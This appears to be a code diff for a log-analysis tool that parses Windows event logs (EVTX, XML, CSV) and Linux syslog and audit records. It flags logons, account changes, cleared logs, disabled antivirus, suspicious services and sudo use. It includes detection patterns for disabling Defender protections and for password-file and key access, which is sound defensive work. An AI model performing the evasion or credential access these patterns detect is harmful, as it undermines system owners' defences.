+  note(st,t,ch||prov||'Windows');if(h)inc(st.hosts,h);
+  const E=(k,sev,u,ip,m,x)=>push(st,{t,k,sev,u:u||'',ip:cleanIp(ip),h,m,id,os:'w',x});
+  const su=d.SubjectUserName||'',tu=d.TargetUserName||'';
+  const by=su&&su!=='-'?'（操作者：'+su+'）':'';
+  const sec=ch==='Security'||p.includes('security-auditing')||p.includes('security auditing');
+  if(ch==='System'||p==='eventlog'||p.includes('service control manager'))st.has.sys=1;
+  if(sec||id===1102&&p.includes('eventlog')){
+    st.has.sec=1;
+    switch(id){
+    case 4624:{st.has.logon=1;const lt=String(d.LogonType||'');
+      if(lt==='5'||lt==='0'||lt==='4'&&isSysUser(tu,d.TargetUserSid)||isSysUser(tu,d.TargetUserSid)){st.sysLogon++;break;}
+      E('ok','info',tu,d.IpAddress,'登入成功：'+(LT[lt]||'類型 '+lt)+(d.WorkstationName&&d.WorkstationName!=='-'?'，來源電腦 '+d.WorkstationName:''),{lt});break;}
+    case 4625:{st.has.logon=1;const lt=String(d.LogonType||'');
+      const code=String(d.SubStatus&&!/^0x0+$/.test(d.SubStatus)?d.SubStatus:d.Status||'').toLowerCase();
+      const rs=SUB[code]||(code?'其他原因 '+code:'原因不明');
+      E('fail','info',tu,d.IpAddress,'登入失敗：'+rs+'（'+(LT[lt]||'類型 '+lt)+'）'+(d.WorkstationName&&d.WorkstationName!=='-'?'，來源電腦 '+d.WorkstationName:''),{lt,reason:rs});break;}
+    case 4648:if(isSysUser(su,d.SubjectUserSid))break;
+      E('priv','info',su,d.IpAddress,'使用另一組帳密執行程式：帳號 '+tu+(d.TargetServerName?'，目標 '+d.TargetServerName:'')+(d.ProcessName?'，程式 '+d.ProcessName:''));break;
+    case 4672:if(isSysUser(su,d.SubjectUserSid))break;E('priv','info',su,'','以系統管理員等級的權限登入');break;
+    case 4720:E('acct','med',tu,'','新增帳號「'+tu+'」'+by,{op:'create'});break;
+    case 4722:E('acct','low',tu,'','啟用帳號「'+tu+'」'+by,{op:'enable'});break;
+    case 4723:E('acct','info',tu,'','使用者嘗試變更自己的密碼「'+tu+'」',{op:'pw'});break;
+    case 4724:E('acct','med',tu,'','重設帳號「'+tu+'」的密碼'+by,{op:'reset'});break;
+    case 4725:E('acct','low',tu,'','停用帳號「'+tu+'」'+by,{op:'disable'});break;
+    case 4726:E('acct','med',tu,'','刪除帳號「'+tu+'」'+by,{op:'delete'});break;
+    case 4738:if(isSysUser(su,d.SubjectUserSid))break;E('acct','info',tu,'','變更帳號「'+tu+'」的屬性'+by,{op:'change'});break;
+    case 4781:E('acct','med',d.NewTargetUserName,'','帳號改名：'+d.OldTargetUserName+' → '+d.NewTargetUserName+by,{op:'rename'});break;
+    case 4740:E('lock','med',tu,'','帳號「'+tu+'」因密碼錯誤太多次被鎖定'+(d.TargetDomainName?'（來源電腦 '+d.TargetDomainName+'）':''));break;
+    case 4767:E('acct','info',tu,'','解除帳號「'+tu+'」的鎖定'+by,{op:'unlock'});break;
+    case 4728:case 4732:case 4756:{const mem=d.MemberName&&d.MemberName!=='-'?d.MemberName:(d.MemberSid||'');
+      E('group',ADMGRP.test(tu)?'high':'med',mem,'','把「'+mem+'」加入群組「'+tu+'」'+by,{grp:tu,add:1});break;}
+    case 4729:case 4733:case 4757:{const mem=d.MemberName&&d.MemberName!=='-'?d.MemberName:(d.MemberSid||'');
+      E('group','low',mem,'','把「'+mem+'」從群組「'+tu+'」移除'+by,{grp:tu});break;}
+    case 1102:E('logclr','crit',su,'','「安全性」記錄檔被清除'+by);break;
+    case 4719:{if(isSysUser(su,d.SubjectUserSid)&&!/8448|8450/.test(d.AuditPolicyChanges||''))break;
+      const rm=/%%8448|%%8450|移除|removed/i.test(d.AuditPolicyChanges||'');
+      E('policy',rm?'high':'med',su,'','稽核原則被變更'+(rm?'（關閉了部分記錄項目）':'')+by);break;}
+    case 4616:if(isSysUser(su,d.SubjectUserSid))break;E('time','low',su,'','系統時間被手動變更'+(d.ProcessName?'（程式 '+d.ProcessName+'）':''));break;
+    case 4697:{const path=d.ServiceFileName||'';E('svc',SUSP_SVC.test(path)?'high':'low',su,'','安裝新服務「'+(d.ServiceName||'')+'」，執行檔：'+short(path),{path});break;}
+    case 4698:{const c=d.TaskContent||'';const why=suspect(SUSP_WIN,c)||(SUSP_SVC.test((/<Command>([^<]*)/.exec(c)||[])[1]||'')?'排程執行位置可疑的程式':null);
+      E('task',why?'high':'med',su,'','建立排程工作「'+(d.TaskName||'')+'」'+(why?'（'+why+'）':'')+by+' '+short((/<Command>([^<]*)/.exec(c)||[])[1]||'',160));break;}
+    case 4699:E('task','low',su,'','刪除排程工作「'+(d.TaskName||'')+'」'+by);break;
+    case 4702:if(isSysUser(su,d.SubjectUserSid))break;E('task','low',su,'','修改排程工作「'+(d.TaskName||'')+'」'+by);break;
+    case 4688:{st.procCount++;const cl=d.CommandLine||d.NewProcessName||'';const why=suspect(SUSP_WIN,cl);
+      if(why)E('proc','high',su,'',why+'：'+short(cl,400));break;}
+    case 4776:{const s=String(d.Status||'').toLowerCase();if(s&&!/^0x0+$/.test(s))E('dcfail','info',tu,'','網域帳號驗證失敗 (NTLM)：'+(SUB[s]||s)+(d.Workstation?'，來源電腦 '+d.Workstation:''));break;}
+    case 4771:{const s=String(d.Status||'').toLowerCase();E('dcfail','info',tu,d.IpAddress,'網域帳號驗證失敗 (Kerberos)：'+(KRB[s]||s));break;}
+    case 4768:{const s=String(d.Status||'').toLowerCase();if(s&&!/^0x0+$/.test(s))E('dcfail','info',tu,d.IpAddress,'網域帳號驗證失敗 (Kerberos)：'+(KRB[s]||s));break;}
+    case 4778:E('rdp','info',d.AccountName,d.ClientAddress,'遠端桌面工作階段重新連線'+(d.ClientName?'，來源電腦 '+d.ClientName:''));break;
+    case 5140:{const sh=d.ShareName||'';if(/\\(ADMIN|[A-Z])\$$/i.test(sh)&&!isSysUser(su,d.SubjectUserSid))E('share','low',su,d.IpAddress,'存取系統管理共用 '+sh);break;}
+    case 4946:E('fw','info',su,'','新增防火牆規則「'+(d.RuleName||'')+'」');break;
+    case 4947:E('fw','info',su,'','修改防火牆規則「'+(d.RuleName||'')+'」');break;
+    case 4948:E('fw','info',su,'','刪除防火牆規則「'+(d.RuleName||'')+'」');break;
+    case 4950:E('fw','low',su,'','防火牆設定被變更');break;
+    case 5025:E('fw','high',su,'','Windows 防火牆服務被停止');break;
+    case 4704:E('policy','med',su,'','指派使用者權限：'+short(d.PrivilegeList||'',120)+by);break;
+    case 4739:E('policy','med',su,'','網域原則被變更'+by);break;
+    case 4706:E('policy','high',su,'','新增網域信任關係'+by);break;
+    case 4765:E('acct','high',tu,'','帳號被加入 SID History（可能用於偽冒高權限身分）'+by,{op:'change'});break;
+    case 4794:E('acct','high',su,'','嘗試設定目錄服務還原模式 (DSRM) 管理員密碼',{op:'reset'});break;
+    }
+    return;
+  }
+  if(id===104&&p.includes('eventlog')){E('logclr',/security/i.test(d.Channel||'')?'crit':'high',su,'','「'+(d.Channel||'系統')+'」記錄檔被清除'+by);return;}
+  if(p.includes('service control manager')){
+    if(id===7045){const path=d.ImagePath||da[1]||'';const bad=SUSP_SVC.test(path);
+      E('svc',bad?'high':'low',d.AccountName||'','','安裝新服務「'+(d.ServiceName||da[0]||'')+'」，執行檔：'+short(path)+(bad?'（位置或執行方式可疑）':''),{path});}
+    else if(id===7034||id===7031)E('crash','info','','','服務「'+(d.param1||da[0]||'')+'」意外中止');
+    else if(id===7040){const svc=d.param1||da[0]||'',nw=d.param3||da[2]||'';
+      if(/disabled|停用/i.test(nw)&&/defend|event ?log|firewall|update|security|sense|sysmon|防火牆|事件記錄/i.test(svc))E('avoff','high','','','安全相關服務「'+svc+'」被設為停用');}
+    return;
+  }
+  if(p==='eventlog'){
+    if(id===6008)E('power','low','','','上一次關機為「非預期關機」（當機、斷電或被強制關閉）');
+    else if(id===6005)E('power','info','','','系統開機（事件記錄服務啟動）');
+    else if(id===6006)E('power','info','','','系統正常關機（事件記錄服務停止）');
+    return;
+  }
+  if(id===41&&p.includes('kernel-power')){E('power','low','','','系統未正常關機就重新啟動');return;}
+  if(id===1074&&p==='user32'){E('power','info',d.param7||da[6]||'','','使用者或程式要求關機/重新啟動：'+short(d.param1||da[0]||'',120));return;}
+  if(p.includes('windows defender')||p.includes('windows-defender')){
+    st.has.def=1;const th=d['Threat Name']||d['威脅名稱']||'',path=d.Path||d['路徑']||'',u=d['Detection User']||'';
+    if(id===1116||id===1006||id===1015)E('mal','high',u,'','防毒軟體偵測到惡意程式「'+th+'」 '+short(path,200));
+    else if(id===1117||id===1007)E('mal','med',u,'','防毒軟體已對惡意程式「'+th+'」採取處置 '+short(path,200));
+    else if(id===1118||id===1119||id===1008)E('mal','crit',u,'','防毒軟體處置惡意程式「'+th+'」失敗 '+short(path,200));
+    else if(id===5001)E('avoff','high','','','防毒「即時保護」被關閉');
+    else if(id===5010||id===5012)E('avoff','high','','','防毒掃描功能被停用');
+    else if(id===5007){const nv=d['New Value']||'';if(/Exclusions|DisableRealtimeMonitoring|DisableAntiSpyware|DisableBehaviorMonitoring/i.test(nv))E('avoff','med','','','防毒設定被變更（排除項目或停用保護）：'+short(nv,200));}
+    return;
+  }
+  if(p.includes('powershell')){
+    st.has.ps=1;
+    if(id===4104){const s=d.ScriptBlockText||d._msg||'';const why=suspect(SUSP_WIN,s);if(why)E('proc','high','','',why+'：'+short(s,400));}
+    else if(id===400||id===600){const s=da.join(' ');const m=/HostApplication=([^\r\n]*)/.exec(s);const why=m&&suspect(SUSP_WIN,m[1]);if(why&&id===400)E('proc','high','','',why+'：'+short(m[1],400));}
+    return;
+  }
+  if(p.includes('sysmon')&&id===1){const why=suspect(SUSP_WIN,d.CommandLine);if(why)E('proc','high',d.User,'',why+'：'+short(d.CommandLine,400));return;}
+  if(p.includes('terminalservices-remoteconnectionmanager')&&id===1149){st.has.rdp=1;E('rdp','info',d.Param1,d.Param3,'遠端桌面連線通過驗證'+(d.Param2?'（網域 '+d.Param2+'）':''));return;}
+  if(p.includes('terminalservices-localsessionmanager')&&(id===21||id===25)){st.has.rdp=1;const ip=cleanIp(d.Address);if(ip)E('rdp','info',d.User,ip,id===21?'遠端桌面登入成功':'遠端桌面重新連線');return;}
+  if(p.includes('taskscheduler')){st.has.task=1;
+    if(id===106)E('task','low',d.UserContext,'','註冊排程工作「'+(d.TaskName||'')+'」');
+    else if(id===141)E('task','low',d.UserName,'','刪除排程工作「'+(d.TaskName||'')+'」');return;}
+  if(p.includes('firewall')){
+    if(id===2004)E('fw','info',d.ModifyingUser,'','新增防火牆規則「'+(d.RuleName||'')+'」');
+    else if(id===2005)E('fw','info',d.ModifyingUser,'','修改防火牆規則「'+(d.RuleName||'')+'」');
+    else if(id===2006)E('fw','info',d.ModifyingUser,'','刪除防火牆規則「'+(d.RuleName||'')+'」');
+    else if(id===2003||id===2002)E('fw','low',d.ModifyingUser,'','防火牆設定被變更');return;}
+  if(id===1000&&p==='application error'){E('crash','info','','','程式當機：'+(da[0]||d.AppName||''));return;}
+  if(p==='msiinstaller'){
+    if(id===11707||id===1033)E('sw','info','','','安裝軟體：'+short(da[0]||'',160));
+    else if(id===11724||id===1034)E('sw','info','','','移除軟體：'+short(da[0]||'',160));}
+}
+
+/* ───────────── EVTX 二進位解析 ───────────── */
+function u16s(dv,o,n){let s='';for(let i=0;i<n;i++)s+=String.fromCharCode(dv.getUint16(o+i*2,true));return s;}
+function cname(c,o){let s=c.names.get(o);if(s===undefined){s=u16s(c.dv,o+8,c.dv.getUint16(o+6,true));c.names.set(o,s);}return s;}
+const hx=(n,w)=>n.toString(16).padStart(w,'0');
+function ftime(dv,o){return (dv.getUint32(o+4,true)*4294967296+dv.getUint32(o,true))/10000-11644473600000;}
+function subval(c,type,o,size){const dv=c.dv;
+  if(size===0&&type!==0)return '';
+  switch(type){
+    case 0:return null;
+    case 1:{let s=u16s(dv,o,size>>1);const z=s.indexOf('\0');return z>=0?s.slice(0,z):s;}
+    case 2:{let s='';for(let i=0;i<size;i++){const b=dv.getUint8(o+i);if(!b)break;s+=String.fromCharCode(b);}return s;}
+    case 3:return String(dv.getInt8(o));case 4:return String(dv.getUint8(o));
+    case 5:return String(dv.getInt16(o,true));case 6:return String(dv.getUint16(o,true));
+    case 7:return String(dv.getInt32(o,true));case 8:return String(dv.getUint32(o,true));
+    case 9:return dv.getBigInt64(o,true).toString();case 10:return dv.getBigUint64(o,true).toString();
+    case 11:return String(dv.getFloat32(o,true));case 12:return String(dv.getFloat64(o,true));
+    case 13:return dv.getUint32(o,true)?'true':'false';
+    case 14:{let s='';for(let i=0;i<Math.min(size,64);i++)s+=hx(dv.getUint8(o+i),2);return s;}
+    case 15:return '{'+hx(dv.getUint32(o,true),8)+'-'+hx(dv.getUint16(o+4,true),4)+'-'+hx(dv.getUint16(o+6,true),4)+'-'+hx(dv.getUint8(o+8),2)+hx(dv.getUint8(o+9),2)+'-'+[10,11,12,13,14,15].map(i=>hx(dv.getUint8(o+i),2)).join('')+'}';
+    case 16:return '0x'+(size===8?dv.getBigUint64(o,true).toString(16):dv.getUint32(o,true).toString(16));
+    case 17:return new Date(ftime(dv,o)).toISOString();
+    case 18:return dv.getUint16(o,true)+'-'+p2(dv.getUint16(o+2,true))+'-'+p2(dv.getUint16(o+6,true))+'T'+p2(dv.getUint16(o+8,true))+':'+p2(dv.getUint16(o+10,true))+':'+p2(dv.getUint16(o+12,true))+'Z';
+    case 19:{const n=dv.getUint8(o+1);let a=0;for(let i=2;i<8;i++)a=a*256+dv.getUint8(o+i);let s='S-'+dv.getUint8(o)+'-'+a;for(let i=0;i<n;i++)s+='-'+dv.getUint32(o+8+i*4,true);return s;}
+    case 20:return '0x'+dv.getUint32(o,true).toString(16);
+    case 21:return '0x'+dv.getBigUint64(o,true).toString(16);
+    case 0x81:return u16s(dv,o,size>>1).split('\0').filter(Boolean).join(', ');
+    default:return '';
+  }
+}
+const ENT={amp:'&',lt:'<',gt:'>',quot:'"',apos:"'"};
+function binxml(c,pos,end,subs,parent,depth){
+  if(depth>24)throw new Error('depth');
+  const dv=c.dv,stack=[];let cur=parent,attr=null;
+  const text=s=>{if(attr!==null)cur.a[attr]=(cur.a[attr]||'')+s;else cur.t+=s;};
+  while(pos<end){
+    const tok=dv.getUint8(pos),k=tok&0x1f;
+    switch(k){
+    case 0x00:return pos+1;
+    case 0x0f:pos+=4;break;
+    case 0x01:{const no=dv.getUint32(pos+7,true);let p=pos+11;if(no===p)p+=10+2*dv.getUint16(p+6,true);if(tok&0x40)p+=4;
+      const node={n:cname(c,no),a:{},c:[],t:''};cur.c.push(node);stack.push(cur);cur=node;attr=null;pos=p;break;}
+    case 0x02:pos++;attr=null;break;
+    case 0x03:case 0x04:pos++;attr=null;cur=stack.pop()||parent;break;
+    case 0x05:{const ty=dv.getUint8(pos+1);if(ty!==1)throw new Error('valtype '+ty);const n=dv.getUint16(pos+2,true);text(u16s(dv,pos+4,n));pos+=4+n*2;break;}
+    case 0x06:{const no=dv.getUint32(pos+1,true);pos+=5;if(no===pos)pos+=10+2*dv.getUint16(pos+6,true);attr=cname(c,no);break;}
+    case 0x07:{const n=dv.getUint16(pos+1,true);text(u16s(dv,pos+3,n));pos+=3+n*2;break;}
+    case 0x08:text(String.fromCharCode(dv.getUint16(pos+1,true)));pos+=3;break;
+    case 0x09:{const no=dv.getUint32(pos+1,true);pos+=5;if(no===pos)pos+=10+2*dv.getUint16(pos+6,true);text(ENT[cname(c,no)]||'');break;}
+    case 0x0c:{const def=dv.getUint32(pos+6,true);let p=pos+10;const dsz=dv.getUint32(def+20,true);if(def===p)p+=24+dsz;
+      const n=dv.getUint32(p,true);p+=4;const sb=new Array(n);let vo=p+n*4;
+      for(let i=0;i<n;i++){const sz=dv.getUint16(p+i*4,true);sb[i]=[dv.getUint8(p+i*4+2),vo,sz];vo+=sz;}
+      binxml(c,def+24,def+24+dsz,sb,cur,depth+1);pos=vo;break;}
+    case 0x0d:case 0x0e:{const s=subs&&subs[dv.getUint16(pos+1,true)];pos+=4;if(!s)break;
+      if(s[0]===0x21){if(attr===null)binxml(c,s[1],s[1]+s[2],null,cur,depth+1);}
+      else{const v=subval(c,s[0],s[1],s[2]);if(v!==null)text(v);}break;}
+    default:throw new Error('token 0x'+tok.toString(16));
+    }
+  }
+  return pos;
+}
+function flat(n,o){for(const ch of n.c){if(ch.c.length)flat(ch,o);if(ch.t&&o[ch.n]===undefined)o[ch.n]=ch.t;}}
+function treeToRaw(root,t){const ev=root.c[0];if(!ev)return null;const r={t,d:{},da:[],id:0};
+  for(const s of ev.c){
+    if(s.n==='System'){for(const f of s.c){switch(f.n){case 'Provider':r.prov=f.a.Name||f.a.EventSourceName||'';break;case 'EventID':r.id=+f.t;break;case 'Computer':r.comp=f.t;break;case 'Channel':r.ch=f.t;break;}}}
+    else if(s.n==='EventData'){for(const f of s.c){if(f.n==='Data'){if(f.a.Name)r.d[f.a.Name]=f.t;else r.da.push(f.t);}}}
+    else if(s.n==='UserData'){flat(s,r.d);}
+  }
+  return r;
+}
+async function readEvtx(st,file,info,onp){
+  const CH=65536,BATCH=128*CH;let off=4096,cnt=0;
+  while(off<file.size){
+    const buf=await file.slice(off,off+BATCH).arrayBuffer();
+    for(let co=0;co+512<=buf.byteLength;co+=CH){
+      const len=Math.min(CH,buf.byteLength-co),dv=new DataView(buf,co,len);
+      if(dv.getUint32(0,true)!==0x43666c45||dv.getUint32(4,true)!==0x6b6e68)continue; // "ElfChnk"
+      const c={dv,names:new Map()},free=Math.min(dv.getUint32(48,true),len);let r=512;
+      while(r+28<=free&&dv.getUint32(r,true)===0x00002a2a){
+        const size=dv.getUint32(r+4,true);if(size<28||r+size>len)break;
+        try{const root={n:'',a:{},c:[],t:''};binxml(c,r+24,r+size-4,null,root,0);
+          const raw=treeToRaw(root,ftime(dv,r+16));if(raw)ingestWin(st,raw);}
+        catch(e){info.err++;}
+        r+=size;cnt++;
+      }
+    }
+    off+=BATCH;if(onp)onp(Math.min(1,off/file.size));
+    await new Promise(r=>setTimeout(r,0));
+  }
+}
+
+/* ───────────── Windows XML / CSV ───────────── */
+function unent(s){return s.indexOf('&')<0?s:s.replace(/&(#x[0-9a-f]+|#\d+|amp|lt|gt|quot|apos);/gi,(m,e)=>{e=e.toLowerCase();return e[0]==='#'?String.fromCodePoint(e[1]==='x'?parseInt(e.slice(2),16):+e.slice(1)):ENT[e];});}
+function xmlEvent(st,x){
+  const g=re=>{const m=re.exec(x);return m?unent(m[m.length-1]):'';};
+  const r={d:{},da:[]};
+  r.prov=g(/<Provider[^>]*?\sName=(['"])(.*?)\1/);r.id=+g(/<EventID[^>]*>(\d+)</);
+  r.t=Date.parse(g(/<TimeCreated[^>]*?SystemTime=(['"])(.*?)\1/));r.comp=g(/<Computer>([^<]*)</);r.ch=g(/<Channel>([^<]*)</);
+  const ed=/<EventData[^>]*>([\s\S]*?)<\/EventData>/.exec(x);
+  if(ed){const re=/<Data(?:\s+Name=(['"])(.*?)\1)?[^>]*?(?:\/>|>([\s\S]*?)<\/Data>)/g;let m;
+    while((m=re.exec(ed[1]))){const v=unent((m[3]||'').replace(/<[^>]+>/g,' ').trim());if(m[2])r.d[m[2]]=v;else r.da.push(v);}}
+  const ud=/<UserData[^>]*>([\s\S]*?)<\/UserData>/.exec(x);
+  if(ud){const re=/<([A-Za-z_][\w.-]*)[^>]*>([^<]*)<\/\1>/g;let m;while((m=re.exec(ud[1])))if(r.d[m[1]]===undefined)r.d[m[1]]=unent(m[2]);}
+  if(!r.id&&!r.prov)return;if(!(r.t>0))r.t=0;
+  ingestWin(st,r);
+}
+function looseDate(s){if(!s)return 0;s=String(s).trim();let t=Date.parse(s);
+  if(/^\d{4}-\d\d-\d\dT/.test(s)&&t>0)return t;
+  const pm=/下午|PM/i.test(s),am=/上午|AM/i.test(s);const n=s.match(/\d+/g);if(!n||n.length<5)return t>0?t:0;
+  let y,mo,dd;if(n[0].length===4){y=+n[0];mo=+n[1];dd=+n[2];}else{mo=+n[0];dd=+n[1];y=+n[2];if(mo>12){const x=mo;mo=dd;dd=x;}}
+  let hh=+n[3];if(pm&&hh<12)hh+=12;if(am&&hh===12)hh=0;
+  return new Date(y,mo-1,dd,hh,+n[4],+(n[5]||0)).getTime();}
+function msgToData(msg){const d={_msg:msg};if(!msg)return d;
+  const g=re=>{const m=re.exec(msg);return m?m[1].trim():'';};
+  const ac=[...msg.matchAll(/(?:帳戶名稱|Account Name)[:：][ \t]*([^\r\n]*)/g)].map(m=>m[1].trim());
+  d.SubjectUserName=ac[0]||'';d.TargetUserName=ac.length>1?ac[1]:(ac[0]||'');d.MemberName=ac[1]||'';
+  const grp=g(/(?:群組名稱|Group Name)[:：][ \t]*([^\r\n]*)/);if(grp)d.TargetUserName=grp;
+  d.IpAddress=g(/(?:來源網路位址|Source Network Address|用戶端位址|Client Address|來源位址|Source Address)[:：][ \t]*(\S+)/);
+  d.LogonType=g(/(?:登入類型|Logon Type)[:：][ \t]*(\d+)/);
+  d.SubStatus=g(/(?:子狀態|Sub Status)[:：][ \t]*(0x[0-9a-fA-F]+)/);d.Status=g(/(?:狀態|Status)[:：][ \t]*(0x[0-9a-fA-F]+)/);
+  d.WorkstationName=g(/(?:工作站名稱|Workstation Name)[:：][ \t]*([^\r\n]*)/);
+  d.NewProcessName=g(/(?:新處理程序名稱|New Process Name)[:：][ \t]*([^\r\n]*)/);d.CommandLine=g(/(?:處理程序命令列|Process Command Line)[:：][ \t]*([^\r\n]*)/);
+  d.ServiceName=g(/(?:服務名稱|Service Name)[:：][ \t]*([^\r\n]*)/);d.ServiceFileName=d.ImagePath=g(/(?:服務檔案名稱|Service File Name)[:：][ \t]*([^\r\n]*)/);
+  d.TaskName=g(/(?:工作名稱|Task Name)[:：][ \t]*([^\r\n]*)/);d.ShareName=g(/(?:共用名稱|Share Name)[:：][ \t]*([^\r\n]*)/);
+  return d;}
+function csvStream(onRow){let row=[],f='',q=false,pend=false,cr=false;
+  const endRow=()=>{row.push(f);f='';if(row.length>1||row[0]!=='')onRow(row);row=[];};
+  return{feed(s){let i=0;if(pend){pend=false;if(s[0]==='"'){f+='"';i=1;}else q=false;}
+    for(;i<s.length;i++){const c=s[i];
+      if(q){if(c==='"'){if(i+1===s.length){pend=true;}else if(s[i+1]==='"'){f+='"';i++;}else q=false;}else f+=c;}
+      else if(c==='"')q=true;else if(c===','){row.push(f);f='';}
+      else if(c==='\n'){if(!cr)endRow();cr=false;}else if(c==='\r'){endRow();cr=true;continue;}else f+=c;
+      cr=false;}},
+   end(){if(f!==''||row.length)endRow();}};}
+function csvIngester(st,info){let col=null;
+  return row=>{
+    if(!col){if(/^#TYPE/.test(row[0]))return;const f=re=>row.findIndex(c=>re.test(c.trim()));
+      col={id:f(/^(事件識別碼|Event ?ID|Id|InstanceId)$/i),t:f(/^(日期和時間|Date and Time|TimeCreated|TimeGenerated|TimeWritten)$/i),p:f(/^(來源|Source|ProviderName)$/i),
+        m:f(/^(Message|訊息|描述|Description)$/i),h:f(/^(MachineName|電腦|Computer)$/i),ch:f(/^(LogName|記錄檔名稱|ContainerLog)$/i),n:row.length};
+      if(col.id<0)throw new Error('CSV 找不到「事件識別碼 / Event ID」欄位');return;}
+    const id=parseInt(row[col.id],10);if(!(id>=0))return;
+    const msg=col.m>=0?row[col.m]:(row.length>col.n?row[row.length-1]:'');
+    const prov=col.p>=0?row[col.p]:'';
+    ingestWin(st,{id,t:looseDate(col.t>=0?row[col.t]:''),prov,comp:col.h>=0?row[col.h]:'',
+      ch:col.ch>=0&&!/\.evtx?$/i.test(row[col.ch])?row[col.ch]:(/security auditing|安全性稽核/i.test(prov)?'Security':''),d:msgToData(msg),da:[]});
+  };}
+
+/* ───────────── Linux ───────────── */
+const MON={Jan:0,Feb:1,Mar:2,Apr:3,May:4,Jun:5,Jul:6,Aug:7,Sep:8,Oct:9,Nov:10,Dec:11};
+const RE_SYS=/^([A-Z][a-z]{2})\s+(\d{1,2})\s+(\d\d):(\d\d):(\d\d)\s+(\S+)\s+([^\s:\[]+)(?:\[(\d+)\])?:\s*(.*)$/;
+const RE_ISO=/^(\d{4}-\d\d-\d\d)[T ](\d\d:\d\d:\d\d)(?:[.,](\d+))?(Z|[+-]\d\d:?\d\d)?\s+(\S+)\s+([^\s:\[]+)(?:\[(\d+)\])?:\s*(.*)$/;
+const RE_AUD=/^type=(\S+)\s+msg=audit\((\d+)(?:\.\d+)?:\d+\):\s*(.*)$/;
+const SUDOGRP=/^(sudo|wheel|root|adm|admin|docker|lxd)$/;
+function linuxLine(st,line,ref){
+  let m,t,h,prog,msg;
+  if((m=RE_SYS.exec(line))){const y=new Date(ref).getFullYear();t=new Date(y,MON[m[1]],+m[2],+m[3],+m[4],+m[5]).getTime();
+    if(t>ref+2*DAY)t=new Date(y-1,MON[m[1]],+m[2],+m[3],+m[4],+m[5]).getTime();h=m[6];prog=m[7];msg=m[9];}
+  else if((m=RE_ISO.exec(line))){let z=m[4]||'';if(/^[+-]\d{4}$/.test(z))z=z.slice(0,3)+':'+z.slice(3);
+    t=Date.parse(m[1]+'T'+m[2]+(m[3]?'.'+(m[3]+'00').slice(0,3):'')+z);h=m[5];prog=m[6];msg=m[8];}
+  else if((m=RE_AUD.exec(line))){auditLine(st,m[1],+m[2]*1000,m[3]);return true;}
+  else return false;
+  if(!(t>0))return false;
+  linuxMsg(st,t,h,prog,msg);return true;
+}
+function auditLine(st,type,t,rest){
+  st.total++;st.os.linux=1;note(st,t,'Linux audit');
+  const g=k=>{const m=new RegExp('\\b'+k+'="?([^"\\s]+)').exec(rest);return m?m[1]:'';};
+  const acct=g('acct'),ip=g('addr'),ok=/res=success/.test(rest),h=g('hostname')==='?'?'':'';
+  const E=(k,sev,u,ip2,mm,x)=>push(st,{t,k,sev,u:u||'',ip:cleanIp(ip2==='?'?'':ip2),h,m:mm,id:'audit',os:'l',x});
+  if(type==='USER_LOGIN'){st.has.lauth=1;const lt=/sshd/.test(rest)?'ssh':'console';
+    if(ok)E('ok','info',acct||g('id'),ip,'登入成功（稽核記錄）',{lt});else E('fail','info',acct||g('id'),ip,'登入失敗（稽核記錄）',{lt,reason:'帳號或密碼錯誤'});}
+  else if(type==='ADD_USER'&&ok)E('acct','med',acct||g('id'),'','新增帳號「'+(acct||g('id'))+'」',{op:'create'});
+  else if(type==='DEL_USER'&&ok)E('acct','med',acct||g('id'),'','刪除帳號「'+(acct||g('id'))+'」',{op:'delete'});
+}
+function linuxMsg(st,t,h,prog,msg){
+  st.total++;st.os.linux=1;note(st,t,'Linux syslog');if(h)inc(st.hosts,h);
+  const p=prog.toLowerCase().replace(/^.*\//,'');let m;
+  const E=(k,sev,u,ip,mm,x)=>push(st,{t,k,sev,u:u||'',ip:cleanIp(ip),h,m:mm,id:p,os:'l',x});
+  if((m=/^message repeated (\d+) times: \[\s*(.*?)\s*\]$/.exec(msg))){st.total--;for(let i=0,n=Math.min(+m[1],2000);i<n;i++)linuxMsg(st,t,h,prog,m[2]);return;}
+  if(p.startsWith('sshd')){st.has.lauth=1;
+    if((m=/^Accepted (\S+) for (\S+) from (\S+)/.exec(msg))){const pw=/password|keyboard/.test(m[1]);
+      E('ok','info',m[2],m[3],'SSH 登入成功（'+(pw?'使用密碼':m[1]==='publickey'?'使用金鑰':m[1])+'）',{lt:'ssh',pw});}
+    else if((m=/^Failed (\S+) for (invalid user )?(\S*) from (\S+)/.exec(msg))){const key=m[4]+'|'+m[3];
+      if(m[2]&&st.inv.get(key)>t-120000){st.inv.delete(key);return;}
+      const rs=m[2]?'帳號不存在':'密碼錯誤';E('fail','info',m[3],m[4],'SSH 登入失敗：'+rs,{lt:'ssh',reason:rs});}
+    else if((m=/^Invalid user (\S*) from (\S+)/.exec(msg))){st.inv.set(m[2]+'|'+m[1],t);if(st.inv.size>50000)st.inv.clear();
+      E('fail','info',m[1],m[2],'SSH 登入失敗：帳號不存在',{lt:'ssh',reason:'帳號不存在'});}
+    else if((m=/(?:Connection (?:closed|reset)|Disconnected) (?:by|from) (?:(?:authenticating|invalid) user \S* )?(\S+) port \d+ \[preauth\]/.exec(msg))||
+            (m=/^Did not receive identification string from (\S+)/.exec(msg))||(m=/^Unable to negotiate with (\S+)/.exec(msg))||(m=/^banner exchange: Connection from (\S+)/.exec(msg)))inc(st.scan,m[1]);
+    else if((m=/^User (\S+) from (\S+) not allowed because/.exec(msg)))E('fail','info',m[1],m[2],'SSH 登入失敗：此帳號不允許 SSH 登入',{lt:'ssh',reason:'帳號不允許登入'});
+    return;}
+  if(p==='sudo'){st.has.lauth=1;
+    if((m=/^\s*(\S+) : user NOT in sudoers/.exec(msg)))E('priv','high',m[1],'','沒有 sudo 權限的帳號嘗試使用 sudo：'+short(msg.replace(/^.*COMMAND=/,''),200),{fail:1});
+    else if((m=/^\s*(\S+) : command not allowed/.exec(msg)))E('priv','med',m[1],'','嘗試用 sudo 執行未被允許的指令：'+short(msg.replace(/^.*COMMAND=/,''),200),{fail:1});
+    else if((m=/^\s*(\S+) : (?:(\d+) incorrect password attempts? ; )?.*?USER=(\S+) ; (?:.*?)COMMAND=(.*)$/.exec(msg))){
+      if(m[2]){E('priv','med',m[1],'','使用 sudo 時輸入錯誤密碼 '+m[2]+' 次，指令：'+short(m[4],200),{fail:1});return;}
+      const why=suspect(SUSP_LNX,m[4]);
+      if(why)E('proc',/存取密碼檔|新增\/刪除帳號|金鑰/.test(why)?'med':'high',m[1],'',why+'：'+short(m[4],400));
+      E('priv','info',m[1],'','以 '+m[3]+' 權限執行指令：'+short(m[4],300));}
